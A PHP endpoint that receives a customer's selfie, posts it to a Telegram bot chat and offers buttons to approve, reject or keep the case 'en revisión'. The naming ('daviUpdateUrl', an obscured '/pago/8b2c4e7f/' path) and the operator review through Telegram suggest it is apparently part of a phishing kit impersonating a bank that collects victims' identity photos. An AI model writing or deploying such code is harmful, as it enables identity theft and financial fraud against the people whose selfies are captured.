<?php
header('Content-Type: application/json');
include __DIR__ . '/../../db.php';
$config = include __DIR__ . '/../../config.php';

$input = json_decode(file_get_contents('php://input'), true) ?? $_POST;

$cliente_id = $input['cliente_id'] ?? null;
$selfie = $input['selfie'] ?? null;

if (!$cliente_id || !$selfie) {
    echo json_encode(['ok' => false, 'mensaje' => 'Faltan datos']);
    exit();
}

try {
    // Limpiar Base64 y guardar temp file
    $base64Data = preg_replace('/^data:image\/\w+;base64,/', '', $selfie);
    $decoded_file = base64_decode($base64Data);

    $tempFile = tempnam(sys_get_temp_dir(), 'selfie_') . '.jpg';
    file_put_contents($tempFile, $decoded_file);

    // Enviar Foto a Telegram
    $botToken = $config['botToken'];
    $chatId = $config['chatId'];
    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    $daviUpdateUrl = rtrim(dirname($baseUrl), '/\\') . '/pago/8b2c4e7f/updatetele.php';

    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ Aprobar Todo', 'url' => "{$daviUpdateUrl}?id={$cliente_id}&estado=aprobado&key={$security_key}"],
                ['text' => '❌ Rechazar',     'url' => "{$daviUpdateUrl}?id={$cliente_id}&estado=rechazado&key={$security_key}"]
            ],
            [
                ['text' => '⏳ Seguir en revisión', 'url' => "{$daviUpdateUrl}?id={$cliente_id}&estado=en_revision&key={$security_key}"]
            ]
        ]
    ];

    $post_fields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($tempFile),
        'caption' => "📸 *Nueva Selfie Recibida*\n🆔 Cliente: `{$cliente_id}`\n\n¿Qué acción tomar?",
        'parse_mode' => 'Markdown',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_exec($ch);
    curl_close($ch);

    @unlink($tempFile);

    // Actualizar estado a 'en_revision'
    $stmt = $conn->prepare("UPDATE clientes SET estado = 'en_revision' WHERE id = :id");
    $stmt->execute(['id' => $cliente_id]);

    echo json_encode(['ok' => true, 'mensaje' => 'Selfie enviada correctamente']);
} catch (Exception $e) {
    echo json_encode(['ok' => false, 'mensaje' => 'Error enviando selfie: ' . $e->getMessage()]);
}
?>
